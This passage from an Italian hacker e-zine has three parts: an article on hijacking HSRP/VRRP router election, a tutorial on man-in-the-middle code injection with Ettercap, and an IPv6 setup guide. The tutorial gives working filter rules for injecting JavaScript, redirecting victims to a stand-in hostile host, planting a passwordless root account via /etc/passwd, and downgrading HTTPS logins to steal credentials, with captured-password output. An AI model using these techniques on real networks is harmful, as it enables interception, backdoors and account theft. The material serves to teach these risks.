| In ASCII corrisponde alla stringa "cisco" paddata da una sequenza di     |
| zeri finali.                                                             |
| L'ultima word si riferisce al Virtual IP Address che ne nostro caso vale | 
| c0 a8 01 01 che tradotto in decimale corrisponde a 192.168.1.1           |
|                                                                          |
| Ora siamo stati eletti ad active router e possiamo usufruire di tale     |
| posizione per condurre qualsiasi tipo di operazione sui dati che ci      |
| attraversano, tale situazione prende il nome di man in the middle.       |
|                                                                          |
| Virtual Router Redundancy Protocol (VRRP) Φ invece lo standard proposto  |
| dall'IETF che rappresenta l'alternativa ufficiale al protocollo          |
| proprietario HSRP di Cisco.                                              |
| Il protocollo VRRP Φ caratterizzato da un processo di elezione il cui    |
| scopo Φ delineare un master router tra un gruppo di router che           |
| partecipano al protocollo.                                               |
| Il master router Φ scelto sulla base di un livello di prioritα che viene | 
| di norma assegnato ad ogni dispositivo in base alla sua affidabilitα, ad | 
| esso viene delegato il compito di instradatore per la rete.              |
| A differenza di HSRP il router delegato ad una eventuale sostituzione    |
| del master non viene eletto a priori.                                    |
| Lo stesso master router deve preoccuparsi di mandare messaggi VRRP       |
| Advertisement all'indirizzo multicast 224.0.0.18 assegnato al VRRP in    |
| modo tale da consentirne la ricezione da parte di tutti i sistemi che    |
| prendono parte al protocollo, tale messaggio funge da garanzia di        |
| corretto funzionamento e la mancata ricezione di tali messaggio per un   |
| tempo prolungato da vita ad un nuovo processo di elezione.               |
| Tuttavia il malfunzionamento del dispositivo che funge da master non     |
| rappresenta la sola condizione in cui esso viene sostituito, questo lo   |
| si deduce dal seguente passo tratto dall'RFC 2338:                       |
|                                                                          |
|                                                                          |
| - If an ADVERTISEMENT is received, then:                                 |
|                                                                          |
| [snip]                                                                   |
|                                                                          |
|             If the Priority in the ADVERTISEMENT is greater than the     |
|             local Priority,                                              |
|             or                                                           |
|             If the Priority in the ADVERTISEMENT is equal to the local   |
|             Priority and the primary IP Address of the sender is greater | 
|             than the local primary IP Address, then:                     |
|                                                                          |
|              o Cancel Adver_Timer                                        |
|              o Set Master_Down_Timer to Master_Down_Interval             |
|              o Transition to the {Backup} state                          |
|                                                                          |
|                                                                          |
|                                                                          |
| L'opzione di preemption (letteralmente prerilascio) permette ad un       |
| backup router che partecipi al protocollo VRRP lo scavalcamento del      |
| master router in presenza di un valore di prioritα superiore.            |
| Ad un attaccante basterα inviare un messaggio VRRP Advertisement con una | 
| prioritα maggiore al master router, nel caso in cui al master router sia | 
| stato assegnato il valore di prioritα massimo (255) la prioritα sarα     |
| valutata sulla base dell'indirizzo IP con il valore pi∙ elevato.         |
| Operando in tale maniera un utente malizioso Φ in grado di prendere il   |
| posto di instradatore per la rete e mirare a compromettere l'integritα   |
| dei dati trasmessi.                                                      |
|                                                                          |
|                                                                          |
| 3. Risorse                                                               |
|                                                                          |
| TCP/IP Illustrated Volume 1, W. Richard Stevens                          |
| RFC 792, RFC 1256, RFC 2281, RFC 2338, RFC 2131                          |
| http://ettercap.sourceforge.net/papers/                                  |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ HACKiNG                                    #08 - 01/11/2002 |
| C0DE iNJECTi0N                                          [eazy] 0x07/0x1A |
+--------------------------------------------------------------------------+
|                                                                          |
|                                                                          |
| 1. Introduzione                                                          |
|                                                                          |
| 2. Man In The Middle                                                     |
|                                                                          |
| 3. Code Injection                                                        |
|   3.1 Ettercap                                                           |
|   3.2 JavaScript and HTML injection                                      |
|   3.3 Trojanizzare on-fly                                                |
|   3.4 SSL/TLS Bypass                                                     |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
| 1. Introduzione                                                          |
|                                                                          |
| Il termine code injection sta ad indicare una tecnica con la quale un    |
| attacker Φ in grado di iniettare codice arbitrario all'interno di un     |
| flusso di dati scambiato tra due host al fine di alterarne il contenuto. | 
| Molto spesso il codice iniettato ha la facoltα di compromettere una      |
| delle due stazioni che partecipano alla comunicazione.                   |
|                                                                          |
| 2. Man In The Middle                                                     |
|                                                                          |
| Condizione necessaria affinchΦ l'iniezione di codice abbia successo Φ    |
| quella di trovarsi nel mezzo della connessione ovvero l'host dal quale   |
| proviene l'attacco deve trovarsi in una posizione privilegiata che gli   |
| permetta di ricevere e forwardare i pacchetti che gli giungono da        |
| entrambi i capi della sessione.                                          |
| Mi limiter≥ a fornire un breve sunto di quanto Φ necessario sapere in    |
| merito al man in the middle fornendo dei collegamenti ad altri testi che | 
| costituiscono un eventuale approfondimento:                              |
|                                                                          |
| - ARP poisoning: Φ la tecnica pi∙ comunemente utilizzata per ottenere    |
|   una situazione di man in the middle, prevede l'invio da parte dell'    |
|   attacker di ARP reply non sollecitate verso l'host che si desidera     |
|   avvelenare;                                                            |
|   Per approfondimenti vedi sezione 5.4.1 del README file di Ettercap     |
|   reperibile all'URL http://ettercap.sourceforge.net;                    |
|                                                                          |
| - DNS spoofing: un po' meno utilizzata, un attacker Φ in grado di        |
|   interferire nel processo di risoluzione dei nomi host forgiando        |
|   delle reply fasulle e inoltrandole al client prima che queste giungano | 
|   dal server DNS.                                                        |
|   Le reply fasulle saranno interpretate dal client al posto di quelle    |
|   legittime provenienti dal server DNS in quanto giunte a destinazione   |
|   per prime, l'IP address contenuto in tali reply corrisponderα a quello | 
|   di un host sotto il controllo dell'attacker.                           |
|   Per approfondimenti vedi articolo "DNS Spoofing Attack" comparso sul   |
|   numero 6 di OndaQuadra;                                                |
|                                                                          |
| - Route mangling: la manipolazione delle tabelle di routing di un host   |
|   permette di influenzarne l'instradamento dei pacchetti al fine di      |
|   trovarsi nel mezzo della sessione.                                     |
|   Per approfondimenti vedi articolo "IP Routing Attack" sul numero 8 di  |
|   OndaQuadra;                                                            |
|                                                                          |
| Vi sarebbero altre tecniche che permettono di realizzare un attacco man  |
| in the middle che sono state omesse per semplicitα in quanto la loro     |
| trattazione non rientra tra le tematiche prese in esame.                 |
| Per il resto dell'articolo NON mi soffermer≥ sulle tecniche di man in    |
| the middle, lascio pertanto al lettore il compito di approfondire        |
| l'argomento sulla base dei riferimenti forniti.                          |
|                                                                          |
|                                                                          |
| 3. Code Injection                                                        |
|                                                                          |
| Ora che sapete tutto (o quasi) sul man in the middle possiamo passare al | 
| tema principale dell'articolo, ovvero l'iniezione di codice verso una    |
| stazione remota.                                                         |
| Trovandoci nel mezzo della comunicazione siamo in gradi di alterare i    |
| dati scambiati tra l'applicazione server e client al fine di inserire    |
| del codice in grado di compromettere uno dei due lati della sessione.    |
| Lo scopo dell'articolo Φ quello di illustrare i pericoli derivanti da    |
| una tale manipolazione guidando il lettore attraverso alcuni semplici    |
| esempi in cui tale tecnica trova applicazione.                           |
|                                                                          |
| 3.1 Ettercap                                                             |
|                                                                          |
| Ettercap Φ il tool di cui mi avvarr≥ per mettere in pratica quanto mi    |
| appresto ad illustrare, il suo compito Φ quello di:                      |
|                                                                          |
| - Provvedere alla realizzazione di una condizione di man in the middle   |
|   tra i due host coinvolti nella comunicazione;                          |
|                                                                          |
| - Intercettare i pacchetti che giungono a noi in seguito alla condizione | 
|   di man in the middle e modificarne il payload(1) secondo le regole da  |
|   noi stabilite, avendo cura di mantenere sincronizzata la sessione TCP  |
|   tramite la modifica on-fly dei campi sequence number e acknowledgment. | 
|   Provvedere inoltre a ricalcolare i campi del pacchetto che risentono   |
|   della modifica del payload (es. checksum) e reinstradare il tutto al   |
|   legittimo destinatario.                                                |
|                                                                          |
| In questo modo i due host continuano a comunicare ma i pacchetti che     |
| giungono loro risultano modificati a nostro piacimento.                  |
|                                                                          |
| (1) payload: l'insieme di bit che non fanno parte dell'intestazione che  |
|     verranno consegnati all'utente finale destinatario del pacchetto, Φ  |
|     anche chiamato il campo dati che contiene le informazioni destinate  |
|     al livello superiore.                                                |
|                                                                          |
| 3.2 JavaScript and HTML injection                                        |
|                                                                          |
| E' possibile iniettare qualsiasi Javascipt o tag HTML malizioso all'     |
| interno delle pagine web che il client della vittima si appresta a       |
| visualizzare causando l'esecuzione di codice potenzialmente pericoloso.  |
|                                                                          |
| Tale operazione pu≥ essere eseguita on-fly da Ettercap che Φ in grado di | 
| sostituire le occorrenze di una stringa all'interno dei pacchetti in     |
| transito (in seguito al man in the middle) con del codice da noi         |
| realizzato. Tale operazione viene condotta secondo le modalitα descritte | 
| nel paragrafo precedente.                                                |
|                                                                          |
| Vediamo un esempio di come sia possibile per un utente malizioso         |
| condurre un simile attacco:                                              |
|                                                                          |
| # ettercap                                                               |
|                                                                          |
| ?????????????????????????? ettercap 0.6.3.1 ???????????????????????????? | 
| ?                                                                        |
| ?                                                                        |
| ???????????????????????????????????????????????????????????????????????? | 
| ?????????   5 hosts in this LAN (192.168.1.4 : 255.255.255.0) ?????????? | 
| ?            1)     192.168.1.4        1)     192.168.1.4                |
| ?            2)     192.168.1.1        2)     192.168.1.1                |
| ?            3)     192.168.1.2        3)     192.168.1.2                |
| ?            4)     192.168.1.3        4)     192.168.1.3                |
| ?            5)    192.168.1.35        5)    192.168.1.35                |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ???????????????????????????????????????????????????????????????????????? | 
|                                                                          |
| Una volta avviato il tool potete scegliere i due capi della connessione  |
| di cui volete catturare la comunicazione e in seguito alterarla, potete  |
| selezionare source e destination utilizzando l'interfaccia a cursori.    |
| Se uno dei due host impegnati nella comunicazione si dovesse rivelare un | 
| sistema remoto non dovrete far altro che selezionare come destinazione   |
| il vostro gateway.                                                       |
| A questo punto potete procedere al poisoning della cache ARP dei due     |
| host premendo il tasto A:                                                |
|                                                                          |
|                                                                          |
| ?????????????????????????? ettercap 0.6.3.1 ???????????????????????????? | 
| ?SOURCE:    192.168.1.35  <???  Filter:  OFF                             |
| ?                      ?? doppleganger ? illithid (ARP Based) ? ettercap | 
| ?DEST  :     192.168.1.1  <???  Active Dissector: ON                     |
| ???????????????????????????????????????????????????????????????????????? | 
| ?????????   5 hosts in this LAN (192.168.1.4 : 255.255.255.0) ?????????? | 
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ???????????????????????????????????????????????????????????????????????? | 
|                                                                          |
| Ora ci troviamo nel mezzo, possiamo iniziare a iniettare codice.         |
| Per far ci≥ dobbiamo stabilire dei filtri che ci permettono di indicare  |
| ad Ettercap quali sostituzioni/modifiche desideriamo apportare al        |
| contenuto dei pacchetti che ci attraverseranno.                          |
| Premendo il tasto F accediamo al menu dei filtri che si presenta cos∞:   |
|                                                                          |
|                                                                          |
| ?????????????????????????? ettercap 0.6.3.1 ???????????????????????????? | 
| ?SOURCE:    192.168.1.35  <???  Filter:  OFF                             |
| ?                      ?? doppleganger ? illithid (ARP Based) ? ettercap | 
| ?DEST  :     192.168.1.1  <???  Active Dissector: ON                     |
| ???????????????????????????????????????????????????????????????????????? | 
| ?????????   5 hosts in this LAN (192.168.1.4 : 255.255.255.0) ?????????? | 
| ?    ??Filters :?????????????????????????????????????????????????????    |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?    ?      S] Filters on Source : OFF   W] Edit filter chain            |
| ?                                                                        |
| ?    ?      D] Filters on Dest   : OFF   E] Edit filter chain            |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ?                                                                        |
| ???????????????????????????????????????????????????????????????????????? | 
|                                                                          |
| Premendo il tasto E possiamo editare i filtri sull'host destinazione,    |
| ovvero inseriamo un controllo sui dati in ingresso sul client.           |
| Il filtro pu≥ ad esempio essere configurato come segue:                  |
|                                                                          |
| Proto : TCP                                                              |
| Source port : 80                                                         |
| Dest port : 0                                                            |
| Search : &lt;html>                                                          |
| Action (Drop/Replace/Log) : R                                            |
| Replace: &lt;html>\r&lt;script language="JavaScript">\ralert('hi!')\r&lt;/script> | 
|                                                                          |
| Dopo aver premuto INVIO per confermare le modifiche, una volta tornati   |
| alla finestra dei filtri premere il tasto D per attivare il filtro sul   |
| destinatario, la voce "Filters on Dest" dovrα apparire cos∞:             |
|                                                                          |
| D] Filters on Dest   : ON                                                |
|                                                                          |
| In questo modo Ettercap intercetta ogni sessione TCP che provenga dalla  |
| porta 80 dell'host destinatario (il web server) diretta a qualsiasi      |
| porta del client e provvede a sostituire ogni occorrenza della stringa   |
| &lt;html> con la stessa stringa seguita dal nostro javascript che verrα     |
| eseguito dalla vittima.                                                  |
| Il carattere \r ha la funzione di decretare il punto in cui il codice va | 
| a capo, ovvero:                                                          |
|                                                                          |
| &lt;html>\r&lt;script language="JavaScript">\ralert('hi!')\r&lt;/script>          |
|                                                                          |
| equivale a...                                                            |
|                                                                          |
| &lt;html>                                                                   |
| &lt;script language="JavaScript">                                           |
| alert('hi!')                                                             |
| &lt;/script>                                                                |
|                                                                          |
| Il codice del javascript in questione non svolge alcuna azione           |
| particolare se non quella di mostrare una finestra di alert con il testo | 
| "hi!" ed Φ stato utilizzato a titolo di esempio.                         |
| Alcuni esempi pi∙ significativi sono rappresentati dall'iniezione dei    |
| seguenti codici:                                                         |
|                                                                          |
| &lt;script language="JavaScript">                                           |
| window.open('http://www.evil.haxor.com')                                 |
| &lt;/script>                                                                |
|                                                                          |
| oppure                                                                   |
|                                                                          |
| &lt;meta http-equiv="Refresh" content="1; URL=http://www.evil.haxor.com">   |
|                                                                          |
| Entrambi causano l'apertura automatica di una pagina potenzialmente      |
| ostile che potrebbe portare all'esecuzione di codice da parte del        |
| browser della vittima (vedi exploits per le varie versioni di Internet   |
| Explorer 5.x e 6).                                                       |
|                                                                          |
|                                                                          |
| 3.3 Trojanizzare on-fly                                                  |
|                                                                          |
| Una diretta conseguenza dell'iniezione di codice Φ la possibilitα di     |
| alterare il contenuto di programmi sotto forma di script o codice        |
| sorgente al file di introdurre al loro interno eventuali backdoor.       |
| Tale operazione risulta piuttosto semplice nel caso di file che si       |
| presentino sotto forma di testo semplice in quanto pi∙ facilmente        |
| soggetti ad eventuali pattern matching e sostituzioni.                   |
| Ancora una volta ci serviremo dei filtri messi a nostra disposizione da  |
| Ettercap per simulare un attacco mirato alla trojanizzazione on-fly di   |
| uno shell script scaricato dalla vittima:                                |
|                                                                          |
| Proto : TCP                                                              |
| Source port : 80                                                         |
| Dest port : 0                                                            |
| Search : !/bin/bash                                                      |
| Action (Drop/Replace/Log) : R                                            |
| Replace: !/bin/bash\r\necho r00t::0:0::/root:/bin/sh >> /etc/passwd\n    |
|                                                                          |
| Questo filtro posto sul destinatario provvede a sostituire al volo le    |
| occorrenze della stringa !/bin/bash, che sta ad indicare l'interprete    |
| dello script, con la stessa stringa seguita dall'aggiunta di una nuova   |
| riga che al momento dell'esecuzione dello script provvederα ad inserire  |
| una backdoor nel sistema.                                                |
| La stessa tecnica Φ applicabile a qualsiasi altro script, la             |
| sostituzione pu≥ essere fatta sulla base di un valore che si presenta    |
| costante come ad esempio la riga relativa all'interprete:                |
|                                                                          |
| #!/bin/bash                                                              |
| #!/bin/sh                                                                |
| #!/usr/bin/perl                                                          |
|                                                                          |
| Un sorgente C rende pi∙ difficoltosa tale operazione a causa dell'       |
| intrinseca complessitα e imprevedibilitα del linguaggio, la conoscenza a | 
| priori del contenuto del file che la vittima si appresta a scaricare pu≥ | 
| facilitare l'attaccante nel forgiare delle regole di sostituzione che    |
| gli                                                                      |
| garantiscano una maggiore probabilitα di successo.                       |
|                                                                          |
|                                                                          |
| 3.4 SSL/TLS Bypass                                                       |
|                                                                          |
| Il protocollo SSL/TLS offre un livello trasporto sicuro e protegge la    |
| comunicazione tra due host per mezzo di meccanismi crittografici         |
| garantendo la confidenzialitα e l'integritα dei dati scambiati, tale     |
| protocollo si avvale di un algoritmo di crittografia ibrido ovvero       |
| utilizza un algoritmo asimmetrico per verificare l'identitα dei due      |
| partecipanti alla comunicazione e per lo scambio della chiave di         |
| sessione che verrα utilizzata per il resto della comunicazione per       |
| crittare la sessione con un algoritmo simmetrico.                        |
| Per maggiori informazioni sul protocollo SSL/TLS Φ possibile fare        |
| riferimento all'articolo "Hack Cryptographic Tunnels" comparso sul       |
| numero 7 di OndaQuadra.                                                  |
|                                                                          |
| Ora vedremo come si pu≥ bypassare la protezione imposta da un server web | 
| che utilizzi SSL per proteggere le sessioni dei clienti da un attacker   |
| che desideri sniffare/modificare i dati che vi transitano.               |
| Molti siti offrono la possibilitα di effettuare il login ai propri       |
| servizi in maniera sicura per mezzo di SSL (es. webmail, home banking).  |
| Tuttavia questi si limitano a trasmettere attraverso un tunnel           |
| crittografico le SOLE credenziali d'accesso e lascino le pagine HTML     |
| trasmesse al client in balia di eventuali malintenzionati che hanno la   |
| possibilitα di modificarle prima che giungano al browser della vittima.  |
| In questo modo Φ possibile modificare il codice delle pagine al fine di  |
| forzare la trasmissione in chiaro delle credenziali da parte del client. | 
|                                                                          |
| Vediamo un esempio, osservando attentamente il codice HTML contenuto     |
| nella pagina di login di Hotmail possiamo notare diversi riferimenti al  |
| protocollo SSL (https):                                                  |
|                                                                          |
| &lt;form name="passwordform"                                                |
|  action="https://loginnet.passport.com/ppsecure/post.srf"                |
|  method="POST" target="_top" >                                           |
|                                                                          |
| oppure ancora...                                                         |
|                                                                          |
| &lt;script language="JavaScript">                                           |
| <!--                                                                     |
| var defAct = document.passwordform.action;                               |
| function SelectChanger(s)                                                |
| {                                                                        |
| var i = s.selectedIndex;                                                 |
| if (i == -1)                                                             |
| {                                                                        |
| return false;                                                            |
| }                                                                        |
| if(i == 0)                                                               |
| {                                                                        |
| document.passwordform.action =                                           |
|  "https://loginnet.passport.com/ppsecure/post.srf";                      |
| return true;                                                             |
| }                                                                        |
| document.passwordform.action =                                           |
|  "https://login.msnia.passport.com/IT/ppsecure/post.asp";                |
| return true;                                                             |
| }                                                                        |
| //-->                                                                    |
| &lt;/script>                                                                |
|                                                                          |
| Tutto ci≥ che un attacker deve fare per garantirsi le credenziali dell'  |
| utente che accede al servizio Φ ricorrere alla tecnica di code injection | 
| e sostituire on-fly nelle pagine HTML tutte le occorrenze della stringa  |
| https con http in modo tale da costringere il browser dell'utente ad     |
| eseguire il login passando username e password in chiaro sulla rete.     |
| Il filtro sul destinatario da settare su Ettercap dovrα essere di questo | 
| tipo:                                                                    |
|                                                                          |
| Proto : TCP                                                              |
| Source port : 80                                                         |
| Dest port : 0                                                            |
| Search : https                                                           |
| Action (Drop/Replace/Log) : R                                            |
| Replace: http                                                            |
|                                                                          |
|                                                                          |
| Una volta che la vittima avrα trasmesso le proprie credenziali sarα      |
| necessario scorrere le voci che compaiono sull'interfaccia a cursori     |
| fino a trovare la voce relativa al login, Ettercap scrive in basso a     |
| sinistra USER e PASS collezionate:                                       |
|                                                                          |
|                                                                          |
| ?????????????????????????? ettercap 0.6.3.1 ???????????????????????????? | 
| ?SOURCE:    192.168.1.35  <???  Filter:  ON                              |
| ?                      ?? doppleganger ? illithid (ARP Based) ? ettercap | 
| ?DEST  :     192.168.1.1  <???  Active Dissector: ON                     |
| ???????????????????????????????????????????????????????????????????????? | 
| ?????????   5 hosts in this LAN (192.168.1.4 : 255.255.255.0) ?????????? | 
| ?  1)  192.168.1.35:1047    <-->     192.168.1.1:53    ?   UDP  ? domain | 
| ?  2)  192.168.1.35:1048    <-->   66.35.229.101:80    ? CLOSED ? www    |
| ?  3)  192.168.1.35:1049    <-->     192.168.1.1:53    ?   UDP  ? domain | 
| ?  4)  192.168.1.35:1050    <-->   217.18.105.47:80    ? silent ? www    |
| ?  5)  192.168.1.35:1051    <-->     192.168.1.1:53    ?   UDP  ? domain | 
| ?  6)  192.168.1.35:1052    <-->       64.4.43.7:80    ? KILLED ? www    |
| ?  7)  192.168.1.35:1053    <-->     192.168.1.1:53    ?   UDP  ? domain | 
| ?  8)  192.168.1.35:1054    <-->       64.4.43.7:80    ? CLOSED ? www    |
| ?  9)  192.168.1.35:1055    <-->     192.168.1.1:53    ?   UDP  ? domain | 
| ? 10)  192.168.1.35:1056    <-->  207.68.177.124:80    ? CLOSED ? www    |
| ? 11)  192.168.1.35:1057    <-->   66.35.229.101:80    ? CLOSED ? www    |
| ? 12)  192.168.1.35:1058    <-->     192.168.1.1:53    ?   UDP  ? domain | 
| ? 13)  192.168.1.35:1059    <-->   65.54.225.241:80    ? CLOSED ? www    |
| ? 14)  192.168.1.35:1060    <-->       64.4.43.7:80    ? CLOSED ? www    |
| ? 15)  192.168.1.35:1061    <-->       64.4.43.7:80    ? CLOSED ? www    |
| ???????????????????????????????????????????????????????????????????????? | 
| ?? Your IP: 192.168.1.4 MAC: 00:00:00:00:00:00 Iface: eth0 Link: HUB ??? | 
| ?  USER: isi                                                             |
| ?  PASS: secret     http://lc1.law13.hotmail.passport.com/cgi-bin/logi-> | 
| ???????????????????????????????????????????????????????????????????????? | 
|                                                                          |
| La stessa debolezza Φ stata riscontrata in siti che offrono servizi ben  |
| pi∙ delicati come ad esempio home banking o trading online, gli stessi   |
| sono stati avvisati del problema tuttavia attualmente non Φ ancora stato |
| corretto per tanto ho preferito occultarne l'identitα.                   |
| Nella home page compare un form che consente il login degli utenti e     |
| tale pagina viene trasmessa al browser in maniera non sicura e risulta   |
| pertanto suscettibile ad alterazioni che possono modificare la procedura | 
| di login forzando il client alla trasmissione in chiaro delle            |
| credenziali utente.                                                      |
|                                                                          |
|                                                                          |
| ?????????????????????????? ettercap 0.6.3.1 ???????????????????????????? | 
| ?SOURCE:    192.168.1.35  <???  Filter:  ON                              |
| ?                      ?? doppleganger ? illithid (ARP Based) ? ettercap | 
| ?DEST  :     192.168.1.1  <???  Active Dissector: ON                     |
| ???????????????????????????????????????????????????????????????????????? | 
| ?????????   5 hosts in this LAN (192.168.1.4 : 255.255.255.0) ?????????? | 
| ?  1)  192.168.1.35:1064    <-->     192.168.1.1:53    ?   UDP  ? domain | 
| ?  2)  192.168.1.35:1065    <-->     192.168.1.1:53    ?   UDP  ? domain | 
| ?  3)  192.168.1.35:1066    <--> xxx.xxx.xxx.xxx:80    ? CLOSED ? www    |
| ?  4)  192.168.1.35:1067    <-->   xx.xx.xxx.xxx:80    ? CLOSED ? www    |
| ?  5)  192.168.1.35:1068    <--> xxx.xxx.xxx.xxx:80    ? CLOSED ? www    |
| ?  6)  192.168.1.35:1069    <-->     192.168.1.1:53    ?   UDP  ? domain | 
| ?  7)  192.168.1.35:1070    <--> xxx.xxx.xxx.xxx:80    ? KILLED ? www    |
| ?  8)  192.168.1.35:1071    <--> xxx.xxx.xxx.xxx:80    ? KILLED ? www    |
| ?  9)  192.168.1.35:1072    <--> xxx.xxx.xxx.xxx:80    ? CLOSED ? www    |
| ? 10)  192.168.1.35:1073    <--> xxx.xxx.xxx.xxx:80    ? CLOSED ? www    |
| ? 11)  192.168.1.35:1074    <--> xxx.xxx.xxx.xxx:80    ? KILLED ? www    |
| ? 12)  192.168.1.35:1075    <--> xxx.xxx.xxx.xxx:80    ? CLOSED ? www    |
| ? 13)  192.168.1.35:1076    <--> xxx.xxx.xxx.xxx:80    ? KILLED ? www    |
| ? 14)  192.168.1.35:1077    <--> xxx.xxx.xxx.xxx:80    ? KILLED ? www    |
| ?                                                                        |
| ???????????????????????????????????????????????????????????????????????? | 
| ?? Your IP: 192.168.1.4 MAC: 00:00:00:00:00:00 Iface: eth0 Link: HUB ??? | 
| ?  USER: isi                                                             |
| ?  PASS: secret     http://www.xxxxxx.it/xxxxxx/jsp/login/login.html     |
| ???????????????????????????????????????????????????????????????????????? | 
|                                                                          |
| I link presenti in home page che conducono a pagine accessibili tramite  |
| protocollo sicuro https possono essere modificati al volo in favore di   |
| link http potenzialmente insicuri, in questo modo tali pagine si         |
| prestano a loro volta a subire modifiche da parte di un malintenzionato. | 
| Sul sito stesso si possono per di pi∙ reperire le seguenti informazioni: |
|                                                                          |
|    "Di norma, i browser visualizzano nella barra inferiore l'icona di un |
|    lucchetto chiuso per avvisare l'utente che sta navigando in pagine    |
|    sicure.                                                               |
|                                                                          |
|    Ill sito xxxxxx, per rendere pi∙ veloce la navigazione e le           |
|    operazioni, Φ stato strutturato a "frames": ci≥ significa che tutte   |
|    le pagine vengono caricate all'interno di una cornice che rimane      |
|    costante.                                                             |
|    Tutte le pagine del sito xxxxxx nelle quali avviene l'inserimento o   |
|    l'invio di dati sono sicure e protette: la mancata visualizzazione    |
|    del lucchetto chiuso da parte del browser dipende dalla struttura a   |
|    frames*."                                                             |
|                                                                          |
| Il fatto che il sito NON visualizzi mai l'icona del lucchetto fa si che  |
| l'utente non riscontri alcuna anomalia durante le operazioni di login.   |
| L'unico modo per proteggersi da questa forma di attacco Φ quello di      |
| forzare l'accesso al sito esclusivamente in https in quanto un link      |
| https in una pagina accessibile tramite protocollo http pu≥ essere       |
| vittima di alterazioni che lo rendono a sua volta insicuro!              |
+--------------------------------------------------------------------------+




+--------------------------------------------------------------------------+
| ONDAQUADRA ~ NETW0RKiNG                                 #08 - 01/11/2002 |
| iMP0STARE iL DUAL STACK IPV6 / IPV4            [Master^Shadow] 0x08/0x1A |
+--------------------------------------------------------------------------+
| &lt;Intro />                                                                |
| Ho scritto questa semplicissima guida per permettere a tutti di          |
| utilizzare il protocollo IPV6, la nuova generazione di IP Address.       |
| Penso che oramai tutti sappiano che la vecchia generazione Ipv4 ha       |
| quasi raggiunto il limite massimo di indirizzamento e che, se non        |
| aggiornata, non si potranno pi∙ aggiungere altri indirizzi.              |
| Ipv6 Φ quindi il successore di Ipv4. E' un protocollo a 128 bit e        |
| offre una capacitα di indirizzamento praticamente illimitata             |
| rispetto a quella offerta dai 32 bit di Ipv4.                            |
| Il nuovo protocollo Φ inoltre stato studiato per aumentare la            |
| sicurezza, gestibile ora a bassissimo livello, e per evitare i vari      |
| metodi di sniffing e spoofing.                                           |
| Ovviamente non Φ tutto oro quello che luccica: un motivo di              |
| preoccupazione security-related per Ipv6 Φ la sua caratteristica di      |
| autoconfigurazione.                                                      |
| Questo permetterebbe di immettersi abbastanza facilmente in una lan      |
| Ipv6 e perci≥ questa caratteristica va presa con le pinze.               |
| Una caratteristica di Ipv6 Φ inoltre quella di incompatibilitα con       |
| Ipv4.                                                                    |
| E' perci≥ necessario implementare il dual stack nelle varie box e        |
| riscrivere diverse applicazione web.                                     |
|                                                                          |
| &lt;Win2k />                                                                |
| Per utilizzare Ipv6 sotto Windows2000 occorre un sistema aggiornato      |
| almeno a Service Pack 1 o a Service Pack 2.                              |
| Se siamo il possesso di queste caratteristiche dobbiamo scaricare        |
| l'Ipv6 stack per SP1 o SP2.                                              |
|                                                                          |
| Cerchiamo su google il nome del file stack e scarichiamolo:              |
|                                                                          |
| Stack Ipv6 per W2k SP1: tpipv6-001205.exe                                |
| Stack Ipv6 per W2k SP2: tpipv6-001205-SP2-IE6.zip                        |
|                                                                          |
| Installiamo lo stack dalla cartella setup del package cliccando su       |
| hotfix e riavviamo il sistema.                                           |
| Una volta riavviato se non si possiede una scheda di rete bisogna        |
| installarne una virtuale in loopback. Per fare ci≥ bisogna andare in     |
| Pannello di controllo e premere Installa nuovo hardware.                 |
| Premiamo aggiungi nuova periferica e poi scegliamo di selezionare        |
| l'hardware da un elenco. Come produttore scegliamo Micro$oft e come      |
| prodotto Scheda micro$oft loopback.                                      |
| Ora abbiamo una scheda di rete installata...                             |
| L'ultimo passo per installare Ipv6 su Win2k Φ quello di                  |
| visualizzare le proprietα della rete locale in Rete e connessioni        |
| remote. Una volta aperta                                                 |
| la dialog Φ necessario premere installa e scegliere Protocollo e poi     |
| Aggiungi. Scegliamo Microsoft Ipv6 Protocol e abbiamo finito.            |
|                                                                          |
| &lt;WinXP />                                                                |
| Windows XP viene fornito da Microsoft giα pronto per Ipv6. E'            |
| necessaria la battitura di un solo comando per avere la nostra box       |
| giα pronta per Ipv6.                                                     |
| Aprire il dialog Esegui dal menu Start e scrivere al suo interno il      |
| comando "ipv6 install" senza le virgolette.                              |
| Verrα tutto configurato automaticamente e avremo giα disponibile un      |
| tunnel broker fornito dalla Microsoft per la nostra navigazione          |
| Ipv6.                                                                    |
|                                                                          |
| &lt;Linux_Kernel_2.2.x />                                                   |
| Per avere il supporto Ipv6 in Linux occorre ricompilare il kernel        |
| per abilitare le funzioni per noi interessanti.                          |
| Entriamo come utente root e portiamoci in /usr/src/linux e               |
| cominciamo la configurazione con "make config" (testuale) o "make        |
| menuconfig" (con menu) o "make xconfig" (grafica, necessita              |
| XServer).                                                                |
|                                                                          |
| In "Code maturity level options" abilitiamo:                             |
| - Prompt for development and/or incomplete code/drivers                  |
|                                                                          |
| In "Networking Options" abilitiamo:                                      |
| - Kernel/User netlink socket                                             |
| - Netlink device emulation                                               |
| - The IPv6 protocol (EXPERIMENTAL)                                       |
| - IPv6: enable EUI-64 token format                                       |
| - IPv6: disable provider based addresses                                 |
|                                                                          |
| Ricompiliamo il kernel e impostiamo Lilo per caricare la nuova           |
| immagine                                                                 |
| (Vedi il kernel-howto per sapere come ricompilare il kernel).            |
| Ora siamo pronti per Ipv6!                                               |
|                                                                          |
| &lt;Linux_Kernel_2.4.x />                                                   |
| Anche sul kernel 2.4 occorre ricompilare il kernel:                      |
| portiamoci in /usr/src/linux e diamo il solito "make menuconfig"         |
|                                                                          |
| Questa volta abilitiamo:                                                 |
| In "Code maturity level options":                                        |
| - Prompt for development and/or incomplete code/drivers                  |
|                                                                          |
| e in "Networking Options":                                               |
| - Kernel/User netlink socket                                             |
| - Routing messages                                                       |
| - The IPv6 protocol (EXPERIMENTAL)                                       |
|                                                                          |
